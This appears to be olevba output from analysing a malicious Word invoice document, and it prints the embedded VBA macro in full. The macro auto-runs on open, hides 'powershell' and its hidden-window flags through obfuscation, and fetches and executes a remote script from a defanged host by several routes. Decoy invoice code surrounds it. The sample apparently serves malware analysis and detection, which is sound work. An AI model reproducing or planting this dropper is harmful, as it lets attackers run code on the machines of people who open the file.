Encoding for stdout is only cp1252, will auto-encode text with utf8 before output
olevba 0.60.2 on Python 3.12.7 - http://decalage.info/python/oletools
===============================================================================
FILE: Invoice_2024_0042.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Invoice_2024_0042.doc - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' =====================================================================
'  Acme Corp - Secure Invoice Viewer  (document macro)
'  This content is encrypted. Enable editing and content to decrypt.
' =====================================================================
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

' Word fires AutoOpen / Document_Open automatically when the file opens.
Sub AutoOpen()
    InitDocument
End Sub

Sub Document_Open()
    InitDocument
End Sub

' --- Helper: rebuild a string from a list of character codes -----------
' (used to keep the real command out of plain sight in the source)
Function Dec(ByVal s As String) As String
    Dim parts() As String, i As Integer, out As String
    parts = Split(s, ",")
    For i = LBound(parts) To UBound(parts)
        out = out & Chr(CInt(parts(i)))
    Next i
    Dec = out
End Function

Sub InitDocument()
    Dim host As String, payload As String, dest As String
    Dim app As String

    ' "powershell" assembled from character codes (string obfuscation)
    app = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _
          Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

    ' Staging URL and dropped file (defanged host: *.example.test)
    host = "http://www" & "." & "example" & "." & "test/inv/update.ps1"
    dest = Environ("TEMP") & "\svchost_update.ps1"

    ' Reverse-stored flags -> "-nop -w hidden -ep bypass"
    Dim flags As String
    flags = StrReverse("ssapyb pe neddih w- pon-")

    payload = app & " " & flags & " -c ""IEX (New-Object " & _
        "Net.WebClient).DownloadString('" & host & "')"""

    ' Two independent execution paths (either is enough to run it):
    Shell payload, vbHide
    CreateObject("WScript.Shell").Run payload, 0, False

    ' Backup stage: pull the script to disk via the API declared above,
    ' then hand it to the scripting host.
    URLDownloadToFileA 0, host, dest, 0, 0
    CreateObject("WScript.Shell").Run "wscript " & dest, 0, False
End Sub

' ---------------------------------------------------------------------
' Decoy code below makes the project look like a real invoice tool.
' It is never reached by the auto-exec path but pads the module so the
' analyst has realistic surrounding noise to read past.
' ---------------------------------------------------------------------
Sub FormatInvoice()
    Dim n As Long
    For n = 1 To 25
        ' Line item n: quantity, unit price, extended price
    Next n
End Sub

Function TaxRate(region As String) As Double
    Select Case region
        Case "US-TX": TaxRate = 0.0825
        Case "US-CA": TaxRate = 0.0725
        Case Else:    TaxRate = 0#
    End Select
End Function

' ---------------------------------------------------------------------
' Field reference (decoy documentation, ignored at runtime):
'   InvoiceNo   : string  - unique invoice identifier
'   IssueDate   : date    - date the invoice was generated
'   DueDate     : date    - payment due date
'   BillToName  : string  - customer billing name
'   BillToAddr  : string  - customer billing address
'   ShipToName  : string  - recipient name
'   ShipToAddr  : string  - recipient address
'   Currency    : string  - ISO 4217 currency code
'   Subtotal    : double  - sum of line item extended prices
'   TaxRegion   : string  - region code used for the tax rate lookup
'   TaxAmount   : double  - Subtotal * TaxRate(TaxRegion)
'   Total       : double  - Subtotal + TaxAmount
'   Terms       : string  - payment terms, e.g. Net 30
'   PONumber    : string  - customer purchase order number
' ---------------------------------------------------------------------
Function ExtendedPrice(qty As Double, unit As Double) As Double
    ExtendedPrice = qty * unit
End Function

